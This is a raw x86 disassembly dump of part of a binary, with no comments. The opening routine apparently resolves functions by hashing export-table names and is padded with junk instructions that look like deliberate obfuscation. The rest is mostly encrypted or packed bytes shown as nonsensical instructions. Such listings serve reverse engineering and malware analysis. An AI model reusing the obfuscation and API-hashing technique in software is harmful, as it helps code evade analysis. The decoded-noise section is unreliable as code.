  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x430a24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x430a28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0xa89b29ff,eax
  408b09:	sub    eax,0x7be5ea80
  408b0e:	jnp    0x408b23
  408b10:	pushf  
  408b11:	jnp    0x408b8e
  408b13:	dec    edx
  408b14:	pop    edx
  408b15:	push   ebx
  408b16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b17:	rcr    al,1
  408b19:	ss mov ecx,?
  408b1c:	push   ebx
  408b1d:	mov    ebp,0xe22d666d
  408b22:	jl     0x408ad4
  408b24:	fsubr  st(5),st
  408b26:	push   ss
  408b27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b28:	(bad)  
  408b29:	out    0xdd,al
  408b2b:	in     al,dx
  408b2c:	stos   BYTE PTR es:[edi],al
  408b2d:	mov    bh,0xec
  408b2f:	add    ebx,DWORD PTR [edx]
  408b31:	in     eax,dx
  408b32:	jns    0x408b82
  408b34:	rcl    edi,cl
  408b36:	sar    DWORD PTR [ebx+0x75e7ed18],0xd2
  408b3d:	inc    edx
  408b3e:	push   ecx
  408b3f:	aad    0x85
  408b41:	test   BYTE PTR [esi-0x6d7941cb],0x6c
  408b48:	mov    eax,ds:0xb28cb939
  408b4d:	(bad)  
  408b4e:	(bad)  
  408b4f:	cmp    al,0x5b
  408b51:	out    0x69,eax
  408b53:	jg     0x408b89
  408b55:	shl    BYTE PTR [eax+0x32bc05d4],1
  408b5b:	xchg   edx,eax
  408b5c:	xchg   edi,eax
  408b5d:	and    BYTE PTR [esi],ch
  408b5f:	shr    BYTE PTR [edx+ecx*1-0x36091256],1
  408b66:	inc    esi
  408b67:	into   
  408b68:	and    edi,edx
  408b6a:	mov    dh,0xc0
  408b6c:	sub    BYTE PTR [ebx+ebp*1-0x9],bh
  408b70:	cmp    esp,DWORD PTR [eax]
  408b72:	loope  0x408b49
  408b74:	shr    DWORD PTR [esi+0x41a89258],cl
  408b7a:	xor    DWORD PTR [eax-0x5a826284],eax
  408b80:	fst    DWORD PTR [ebx]
  408b82:	xor    BYTE PTR ds:0xc00eba6d,ah
  408b88:	imul   ecx,eax,0xe8fab7b8
  408b8e:	out    0xd0,eax
  408b90:	jmp    0x408b59
  408b92:	xor    al,0x99
  408b94:	test   BYTE PTR [edi],ch
  408b96:	idiv   bh
  408b98:	aas    
  408b99:	icebp  
  408b9a:	adc    DWORD PTR [edx+0x4c],ecx
  408b9d:	mov    edi,0x78096323
  408ba2:	cmp    BYTE PTR [ecx],cl
  408ba4:	ins    BYTE PTR es:[edi],dx
  408ba5:	mov    ch,0xdc
  408ba7:	loop   0x408b4f
  408ba9:	imul   ecx,DWORD PTR [eax],0x44477b60
  408baf:	push   es
  408bb0:	jmp    0x408b9c
  408bb2:	and    eax,0xc1c567a7
  408bb7:	sub    eax,edi
  408bb9:	in     eax,0xe4
  408bbb:	ret    0x940e
  408bbe:	std    
  408bbf:	cmp    BYTE PTR [edx+ebp*4-0x5e],dh
  408bc3:	push   0xffffff91
  408bc5:	aam    0x9f
  408bc7:	in     eax,dx
  408bc8:	sub    al,0x9e
  408bca:	dec    DWORD PTR [ecx+0x56d1f3f2]
  408bd0:	xor    BYTE PTR [edx-0x20],ch
  408bd3:	stos   BYTE PTR es:[edi],al
  408bd4:	mov    ebp,0xf2f1fdd4
  408bd9:	sbb    edi,eax
  408bdb:	aas    
  408bdc:	mov    BYTE PTR [edi-0x9f5b46c],0x64
  408be3:	fmul   st,st(7)
  408be5:	and    BYTE PTR [edx],bh
  408be7:	sbb    BYTE PTR [ecx+0x5],ah
  408bea:	int    0xa3
  408bec:	nop
  408bed:	mov    esp,0x78346ce2
  408bf2:	push   cs
  408bf3:	popf   
  408bf4:	fadd   DWORD PTR [ebp+0x53]
  408bf8:	inc    esi
  408bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bfb:	loop   0x408bad
  408bfd:	pusha  
  408bfe:	dec    ecx
  408bff:	nop
  408c00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c01:	sar    BYTE PTR [ecx+0x5d017e4a],cl
  408c07:	adc    DWORD PTR [ecx],0xfffffff7
  408c0a:	data16 mov cl,0x51
  408c0d:	push   cs
  408c0e:	xchg   ecx,eax
  408c0f:	inc    edi
  408c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c11:	out    dx,al
  408c12:	out    0xa6,al
  408c14:	adc    eax,0x6e924c3a
  408c19:	mov    ds:0xba2c030d,eax
  408c1e:	test   BYTE PTR [ebp+0x1],dl
  408c21:	aam    0xdd
  408c23:	jno    0x408c8a
  408c25:	ja     0x408bf9
  408c27:	mov    es,WORD PTR [esi]
  408c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c2a:	inc    ebp
  408c2b:	call   0xcc5b88ca
  408c30:	sub    BYTE PTR [ebx+0x304ad6ce],ch
  408c36:	(bad)  
  408c37:	pop    ebx
  408c38:	mov    ch,0x58
  408c3a:	adc    bl,BYTE PTR [esi]
  408c3c:	dec    esi
  408c3d:	test   eax,0x1c527d6e
  408c42:	jne    0x408c95
  408c44:	xchg   esp,eax
  408c45:	mov    eax,ds:0xec27f7b7
  408c4a:	push   0x29e37bdb
  408c4f:	ja     0x408c4a
  408c51:	icebp  
  408c52:	jne    0x408bf2
  408c54:	fnsave [ebx+edi*8]
  408c57:	jl     0x408c23
  408c59:	loop   0x408cbe
  408c5b:	xchg   edx,eax
  408c5c:	out    dx,eax
  408c5d:	or     dl,BYTE PTR [esi-0x20]
  408c60:	enter  0xfd15,0x1b
  408c64:	(bad)  
  408c65:	ins    BYTE PTR es:[edi],dx
  408c66:	mov    edi,0x28750656
  408c6b:	cmc    
  408c6c:	mov    ebx,0x3398f7c4
  408c71:	jmp    0x9d15af8d
  408c76:	sbb    esp,DWORD PTR [eax+0x1be05b7]
  408c7c:	push   ebx
  408c7d:	sub    BYTE PTR [edi],dl
  408c7f:	retf   0x1641
  408c82:	sti    
  408c83:	jmp    0x7453cee1
  408c88:	and    al,0x5a
  408c8a:	pop    esi
  408c8b:	pusha  
  408c8c:	ror    ebp,0xcf
  408c8f:	ficomp DWORD PTR [ebp-0x2f]
  408c92:	or     ah,BYTE PTR [ebp+0x7c1893a1]
  408c98:	xlat   BYTE PTR ds:[ebx]
  408c99:	cmp    DWORD PTR [edx+0x4b5a539f],esp
  408c9f:	and    edi,eax
  408ca1:	shr    BYTE PTR [edi],cl
  408ca3:	fnstenv [eax]
  408ca5:	xchg   esp,eax
  408ca6:	mov    fs,edx
  408ca8:	sub    esp,DWORD PTR [ebx+0x5]
  408cab:	xchg   esp,eax
  408cac:	rcl    ebx,cl
  408cae:	mov    dl,0xa4
  408cb0:	(bad)  
  408cb1:	push   ss
  408cb2:	nop
  408cb3:	sahf   
  408cb4:	idiv   DWORD PTR [esi+0x2dc9f9f7]
  408cba:	scas   al,BYTE PTR es:[edi]
  408cbb:	push   0x37be8fec
  408cc0:	push   ebp
  408cc1:	gs cmp eax,DWORD PTR ds:[edx]
  408cc5:	ins    BYTE PTR es:[edi],dx
  408cc6:	adc    esp,0x33834d41
  408ccc:	daa    
  408ccd:	push   ds
  408cce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ccf:	add    BYTE PTR [eax],dh
  408cd1:	and    BYTE PTR [eax],bh
  408cd3:	mov    bh,0xb8
  408cd5:	pop    eax
  408cd6:	rep ins DWORD PTR es:[edi],dx
  408cd8:	loop   0x408c68
  408cda:	pop    ss
  408cdb:	data16 jge 0x408d4d
  408cde:	jge    0x408cb2
  408ce0:	out    dx,al
  408ce1:	add    BYTE PTR [ebp+0x46e810a3],bl
  408ce7:	nop
  408ce8:	aam    0x7c
  408cea:	(bad)  
  408ceb:	adc    eax,DWORD PTR ds:0x638afd46
  408cf1:	repz aas 
  408cf3:	xchg   ebp,eax
  408cf4:	or     esp,DWORD PTR [edi-0x7]
  408cf7:	fwait
  408cf8:	or     BYTE PTR [edi],ah
  408cfa:	inc    edi
  408cfb:	mov    ebp,0x835e0b40
  408d00:	fs mov eax,0x6e1e1890
  408d06:	shr    DWORD PTR [esi-0x25ac3896],cl
  408d0c:	jmp    0xc95935f9
  408d11:	pushaw 
  408d13:	mov    ds:0x3c84ae4,al
  408d18:	push   cs
  408d19:	push   ebx
  408d1a:	mov    edx,0x42c6af93
  408d1f:	daa    
  408d20:	pushf  
  408d21:	jp     0x408cbf
  408d23:	and    DWORD PTR [ebx],eax
  408d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d26:	xor    cl,BYTE PTR [edi]
  408d28:	pop    esp
  408d29:	test   eax,0x57c9e5e9
  408d2e:	leave  
  408d2f:	ret    0x90c9
  408d32:	in     eax,0xb4
  408d34:	mov    dh,BYTE PTR [eax]
  408d36:	add    eax,0x13a44d03
  408d3b:	sar    BYTE PTR [ecx],cl
  408d3d:	in     al,0x88
  408d3f:	test   eax,0xf0ce3159
  408d44:	(bad)  
  408d45:	jmp    0xa2f0d374
  408d4a:	scas   eax,DWORD PTR es:[edi]
  408d4b:	scas   al,BYTE PTR es:[edi]
  408d4c:	lahf   
  408d4d:	sbb    DWORD PTR [esi],ebp
  408d4f:	or     BYTE PTR [ecx],dl
  408d51:	arpl   di,si
  408d53:	popa   
  408d54:	outs   dx,DWORD PTR ss:[esi]
  408d56:	aas    
  408d57:	mov    al,BYTE PTR [ebp-0x46]
  408d5a:	(bad)  
  408d5b:	(bad)  
  408d5c:	fst    QWORD PTR [ebx-0x441ab4b5]
  408d62:	dec    eax
  408d63:	cmp    al,0x8a
  408d65:	sub    DWORD PTR [ebx+edx*2+0x53e9cd35],ebp
  408d6c:	ret    0xd64b
  408d6f:	(bad)  
  408d70:	rol    ch,0xc4
  408d73:	mov    ah,0x5e
  408d75:	int3   
  408d76:	xchg   esi,eax
  408d77:	cmc    
  408d78:	cmc    
  408d79:	mov    edi,0xb8f3496
  408d7e:	add    al,0xac
  408d80:	mov    al,0xc8
  408d82:	sub    edi,DWORD PTR [edi+0x15]
  408d85:	outs   dx,DWORD PTR ds:[esi]
  408d86:	xchg   esp,eax
  408d87:	aaa    
  408d88:	loopne 0x408d36
  408d8a:	add    bl,BYTE PTR [ecx]
  408d8c:	call   0x42c60ded
  408d91:	cs cmp ah,ch
  408d94:	mov    WORD PTR [ecx+0x47c41944],cs
  408d9a:	clc    
  408d9b:	inc    ecx
  408d9c:	mov    ecx,0xb94eb8d0
  408da1:	mov    cl,BYTE PTR [eax-0x3f]
  408da4:	or     BYTE PTR [eax+0x47c98a41],al
  408daa:	jmp    0x408d3a
  408dac:	or     dh,0xd2
  408daf:	adc    BYTE PTR [ebp+edx*4+0x67],ah
  408db3:	or     BYTE PTR [ebx-0x349be8f],0xbc
  408dba:	sub    bl,cl
  408dbc:	sbb    al,0xd1
  408dbe:	lods   eax,DWORD PTR ds:[esi]
  408dbf:	mov    esp,0x3f1d2bc8
  408dc4:	mov    edi,0xfde2a246
  408dc9:	adc    esp,DWORD PTR [eax]
  408dcb:	in     eax,dx
  408dcc:	push   0x2655729f
  408dd1:	mov    dl,0xf
  408dd3:	int    0xbd
  408dd5:	fwait
  408dd6:	pop    esp
  408dd7:	dec    esi
  408dd8:	icebp  
  408dd9:	pop    ebp
  408dda:	sbb    al,0x5c
  408ddc:	not    ebp
  408dde:	xchg   edx,eax
  408ddf:	push   cs
  408de0:	sbb    BYTE PTR [ebx],ah
  408de2:	cmc    
  408de3:	pop    ss
  408de4:	loopne 0x408d7a
  408de6:	icebp  
  408de7:	mov    ah,0xab
  408de9:	add    bh,BYTE PTR [edi-0xdf4e218]
  408def:	sub    edi,DWORD PTR ds:0x5c6d28e
  408df5:	adc    dl,BYTE PTR [edx]
  408df7:	dec    edx
  408df8:	push   es
  408df9:	push   cs
  408dfa:	cmp    BYTE PTR [ecx-0x27564880],0xaf
  408e01:	das    
  408e02:	dec    ebp
  408e03:	pop    es
  408e04:	cli    
  408e05:	dec    ebp
  408e06:	and    ah,BYTE PTR [edx+0xf170f5d]
  408e0c:	xor    cl,BYTE PTR [edx+0x0]
  408e0f:	adc    DWORD PTR [esi+0x470b45be],0xffffff8e
  408e16:	dec    ebp
  408e17:	add    DWORD PTR ds:0x6c579de,0x71
  408e1e:	(bad)  
  408e1f:	push   ds
  408e20:	into   
  408e21:	mov    WORD PTR [esi-0x24],ss
  408e24:	pop    edx
  408e25:	into   
  408e26:	(bad)  
  408e27:	fsubr  QWORD PTR [ecx-0x60]
  408e2a:	xor    al,0x2b
  408e2c:	aas    
  408e2d:	add    dl,bl
  408e2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e30:	dec    edx
  408e31:	xchg   ebx,eax
  408e32:	stos   BYTE PTR es:[edi],al
  408e33:	adc    al,0xbe
  408e35:	lods   al,BYTE PTR ds:[esi]
  408e36:	xor    al,0xd9
  408e38:	daa    
  408e39:	dec    ecx
  408e3a:	mov    ch,0x3a
  408e3c:	cmp    DWORD PTR [ecx-0x5a],ebp
  408e3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e40:	shl    ebp,1
  408e42:	mov    esp,0xe49f9226
  408e47:	ret    
  408e48:	pop    es
  408e49:	(bad)  
  408e4a:	fsub   DWORD PTR [ecx+0x21]
  408e4d:	jp     0x408ddb
  408e4f:	test   eax,0x9afe82fd
  408e54:	add    eax,0x15dd81ef
  408e59:	xchg   ch,bh
  408e5b:	pop    es
  408e5c:	test   al,0x20
  408e5e:	jne    0x408e47
  408e60:	xor    eax,0xabb470d9
  408e65:	lea    ebx,[ecx]
  408e67:	sahf   
  408e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e69:	xchg   ebx,eax
  408e6a:	sbb    ecx,ecx
  408e6c:	int3   
  408e6d:	xor    DWORD PTR [ebx-0x59d5744d],edx
  408e73:	dec    edx
  408e74:	(bad)  [ebx]
  408e76:	rcr    BYTE PTR [esi],0xb
  408e79:	fucomp st(1)
  408e7b:	sbb    BYTE PTR [bp-0x49c5],al
  408e80:	add    DWORD PTR [ecx-0x63],edi
  408e83:	nop
  408e84:	or     al,0xb0
  408e86:	fsubr  DWORD PTR [ebp-0xf]
  408e89:	fstp   QWORD PTR [eax-0x126d9983]
  408e8f:	pushf  
  408e90:	std    
  408e91:	and    ch,BYTE PTR [eax+0x37013b24]
  408e97:	mov    bh,0xbd
  408e99:	xor    al,0xaf
  408e9b:	dec    esp
  408e9c:	or     bl,BYTE PTR [eax-0x19d78b76]
  408ea2:	pusha  
  408ea3:	(bad)  
  408ea4:	lods   eax,DWORD PTR ds:[esi]
  408ea5:	mov    bl,0x5a
  408ea7:	sub    dh,BYTE PTR [esi]
  408ea9:	mov    cl,0xaf
  408eab:	push   cs
  408eac:	in     al,dx
  408ead:	mov    WORD PTR [esi],?
  408eaf:	popa   
  408eb0:	xchg   ecx,eax
  408eb1:	daa    
  408eb2:	aaa    
  408eb3:	mov    dl,0xa3
  408eb5:	mov    ds:0xa58a506d,eax
  408eba:	cmc    
  408ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ebc:	mov    ds:0x5d7e094,eax
  408ec1:	and    DWORD PTR ds:0x56f87f77,eax
  408ec7:	cmp    DWORD PTR [ecx+0x37],edx
  408eca:	loop   0x408ed3
  408ecc:	ja     0x408e8e
  408ece:	shr    BYTE PTR [eax],0xfb
  408ed1:	push   ds
  408ed2:	or     eax,0x1e295585
  408ed7:	in     eax,dx
  408ed8:	inc    esp
  408ed9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408edb:	jle    0x408e66
  408edd:	sbb    esi,DWORD PTR [eax+esi*1]
  408ee0:	push   edx
  408ee1:	lock cwde 
  408ee3:	cmp    al,0x46
  408ee5:	adc    al,0x93
  408ee7:	lods   eax,DWORD PTR ds:[esi]
  408ee8:	xor    ebx,DWORD PTR [eax]
  408eea:	jmp    0x408f25
  408eec:	aaa    
  408eed:	(bad)  
  408eef:	mov    bh,0xc0
  408ef1:	jecxz  0x408e7b
  408ef3:	hlt    
  408ef4:	test   al,0xd9
  408ef6:	dec    ebx
  408ef7:	jge    0x408eb5
  408ef9:	js     0x408f62
  408efb:	inc    eax
  408efc:	mov    WORD PTR [esi-0x61703742],ds
  408f02:	and    BYTE PTR [ebx+ebx*1-0x4efcb8ba],ch
  408f09:	sub    edx,esp
  408f0b:	or     DWORD PTR [edx-0x2cbe78d9],edx
  408f11:	mov    DWORD PTR [ecx],esp
  408f13:	or     eax,ecx
  408f15:	xchg   esp,eax
  408f16:	popa   
  408f17:	cwde   
  408f18:	dec    ecx
  408f19:	pop    eax
  408f1a:	pop    esp
  408f1b:	aad    0x2d
  408f1d:	or     eax,0x740fff03
  408f22:	mov    ah,0x3
  408f24:	lds    edi,FWORD PTR [eax]
  408f26:	or     BYTE PTR [esp+ebp*8+0x2caa5514],ch
  408f2d:	ret    0xe54a
  408f30:	ins    BYTE PTR es:[edi],dx
  408f31:	sub    cl,BYTE PTR [eax+0x25]
  408f34:	mov    esi,0x44ea7a2f
  408f39:	pop    ss
  408f3a:	dec    esp
  408f3b:	in     eax,dx
  408f3c:	fist   WORD PTR [esi+0x29110826]
  408f42:	mov    eax,0xf44090a6
  408f47:	pusha  
  408f48:	inc    edi
  408f49:	loopne 0x408f86
  408f4b:	xchg   ebp,eax
  408f4c:	inc    ebx
  408f4d:	into   
  408f4e:	gs aad 0xaf
  408f51:	in     al,0xba
  408f53:	pop    es
  408f54:	jp     0x408f5d
  408f56:	sub    eax,0xd65aef63
  408f5b:	mov    edx,0xcbfc9135
  408f60:	sub    eax,0x6235e860
  408f65:	inc    eax
  408f66:	test   al,0xdf
  408f68:	cdq    
  408f69:	nop
  408f6a:	xor    DWORD PTR [ecx-0xffcae1],ebp
  408f70:	dec    edx
  408f71:	push   cs
  408f72:	inc    ebx
  408f73:	in     al,dx
  408f74:	(bad)  [edx-0xb]
  408f77:	sahf   
  408f78:	pop    ds
  408f79:	adc    edx,DWORD PTR [edi-0x44]
  408f7c:	fcmovnb st,st(0)
  408f7e:	mov    ch,0x17
  408f80:	inc    ebx
  408f81:	imul   esi,edx
  408f84:	out    dx,al
  408f85:	(bad)  
  408f86:	in     al,dx
  408f87:	cmp    dl,dh
  408f89:	push   ds
  408f8a:	xchg   edi,eax
  408f8b:	js     0x408f8a
  408f8d:	ja     0x408f5f
  408f8f:	mov    ds:0x32bdb05a,eax
  408f94:	xor    al,0xac
  408f96:	jmp    0x408f29
  408f98:	arpl   WORD PTR [ebx],bx
  408f9a:	sahf   
  408f9b:	inc    esp
  408f9c:	int3   
  408f9d:	or     al,0xd2
  408f9f:	in     eax,0x8b
  408fa1:	loop   0x408f34
  408fa3:	js     0x408fd9
  408fa5:	retf   0x3369
  408fa8:	push   ds
  408fa9:	mov    cl,0x1d
  408fab:	loope  0x408f69
  408fad:	mov    dh,0xbe
  408faf:	mov    WORD PTR [bp+di-0x66e7],es
  408fb4:	jno    0x408f48
  408fb6:	sub    DWORD PTR [ebx],ecx
  408fb8:	retf   
  408fb9:	mov    ds:0x3116c594,al
  408fbe:	xchg   ebp,eax
  408fbf:	push   ecx
  408fc0:	mov    ds:0xbe41b21,eax
  408fc5:	inc    ebx
  408fc6:	adc    DWORD PTR [esi+0x4ac0a40f],ecx
  408fcc:	gs (bad) 
  408fce:	add    eax,DWORD PTR [ecx-0x3a]
  408fd1:	in     al,dx
  408fd2:	out    0x87,al
  408fd4:	add    bh,al
  408fd6:	icebp  
  408fd7:	or     DWORD PTR [edx-0x1a0ea510],eax
  408fdd:	jbe    0x408f82
  408fdf:	fwait
  408fe0:	dec    ebp
  408fe1:	lds    esp,FWORD PTR [ebp-0x6cb10415]
  408fe7:	mov    esp,0x115e2030
  408fec:	xchg   DWORD PTR [ebx-0x396b0cab],ebp
  408ff2:	fdivr  DWORD PTR [ecx+eax*8]
  408ff6:	ror    BYTE PTR [bp+si],1
  408ff9:	xor    BYTE PTR [ebp+0x79],al
  408ffc:	push   ss
  408ffd:	inc    ebx
  408ffe:	sahf   
  408fff:	sbb    eax,DWORD PTR [esi+0x25b87487]
  409005:	xor    DWORD PTR [ebx-0x7d2d8068],0x3a627d90
  40900f:	lock adc BYTE PTR [esi+0x2c],bl
  409013:	and    eax,0x71dc8dbb
  409018:	fsubr  QWORD PTR [edi-0x2d0191fd]
  40901e:	or     BYTE PTR [ebx+0x19],cl
  409021:	imul   ebx,DWORD PTR es:[ebx-0x51],0x7c
  409026:	mov    esp,ebp
  409028:	(bad)  
  409029:	push   ecx
  40902a:	stc    
  40902b:	je     0x409053
  40902d:	or     ebp,DWORD PTR [ecx]
  40902f:	dec    ecx
  409030:	add    DWORD PTR [eax-0x23],edx
  409033:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409034:	push   edi
  409035:	dec    ebx
  409036:	add    al,0xe3
  409038:	add    ebp,DWORD PTR [edi+0x502c5417]
  40903e:	test   bl,cl
  409040:	out    dx,eax
  409041:	dec    ebp
  409042:	ds push edi
  409044:	pop    ds
  409045:	call   0x52ae:0xf19dbbda
  40904c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40904d:	mov    BYTE PTR [esi+0x7cc06044],cl
  409053:	push   edi
  409054:	mov    eax,0x5be946ed
  409059:	adc    eax,0xda19f7cc
  40905e:	(bad)  
  40905f:	sbb    ecx,DWORD PTR [edx+0x5]
  409062:	fucom  st(6)
  409064:	gs inc ebx
  409066:	mov    ?,eax
  409068:	rcl    BYTE PTR [eax+0x25],cl
  40906b:	push   ds
  40906c:	push   edi
  40906d:	dec    edx
  40906e:	in     al,0xde
  409070:	add    dh,BYTE PTR [ebx]
  409072:	jbe    0x4090e6
  409074:	adc    ebx,DWORD PTR [ecx-0x52]
  409077:	nop
  409078:	inc    ebp
  409079:	mov    ah,bh
  40907b:	pop    eax
  40907c:	leave  
  40907d:	loopne 0x4090dc
  40907f:	and    eax,0x9123e33
  409084:	inc    edx
  409085:	(bad)  
  409086:	dec    edi
  409087:	ret    0xa5ab
  40908a:	out    0x5,al
  40908c:	dec    ebx
  40908d:	jecxz  0x409084
  40908f:	inc    ebp
  409090:	xchg   edx,eax
  409091:	lds    esi,FWORD PTR [ebp-0x35]
  409094:	mov    ecx,0xa8b4523e
  409099:	sahf   
  40909a:	mov    ch,0x6d
  40909c:	and    al,0x3e
  40909e:	push   esp
  40909f:	mov    DWORD PTR [ebx-0x559a088d],edx
  4090a5:	jmp    0xd98ab6ec
  4090aa:	in     al,0x94
  4090ac:	inc    ecx
  4090ad:	push   es
  4090ae:	mov    al,0x1a
  4090b0:	in     eax,0x36
  4090b2:	xor    eax,0xa0478ab5
  4090b7:	popf   
  4090b8:	imul   DWORD PTR [esi+0x5]
  4090bb:	pop    ss
  4090bc:	ins    DWORD PTR es:[edi],dx
  4090bd:	push   ds
  4090be:	inc    ecx
  4090bf:	xchg   ebp,eax
  4090c0:	cmp    BYTE PTR [ecx],cl
  4090c2:	mov    eax,0x8daba71a
  4090c7:	pop    esp
  4090c8:	mov    ss,ebp
  4090ca:	sti    
  4090cb:	ss inc esi
  4090cd:	xchg   ebp,eax
  4090ce:	(bad)  
  4090cf:	xor    edx,DWORD PTR [ecx+0x1b]
  4090d2:	call   0x1927df8
  4090d7:	xchg   ebp,eax
  4090d8:	mov    eax,esi
  4090da:	adc    ebp,0x2e734403
  4090e0:	mov    eax,ds:0x1a1d0d95
  4090e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090e6:	cmp    DWORD PTR ds:[edx],0x40
  4090ea:	mov    ecx,0xb985f1ef
  4090ef:	push   ss
  4090f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4090f1:	int3   
  4090f2:	out    0x80,al
  4090f4:	adc    esp,DWORD PTR [eax-0x62196f85]
  4090fa:	int    0x12
  4090fc:	sub    esi,DWORD PTR [edx+ebx*2-0x1b]
  409100:	add    BYTE PTR [ebx],cl
  409102:	mov    ds:0x3373c6e1,eax
  409107:	retf   0x9c9e
  40910a:	jb     0x4090f6
  40910c:	jl     0x409098
  40910e:	in     eax,0x2b
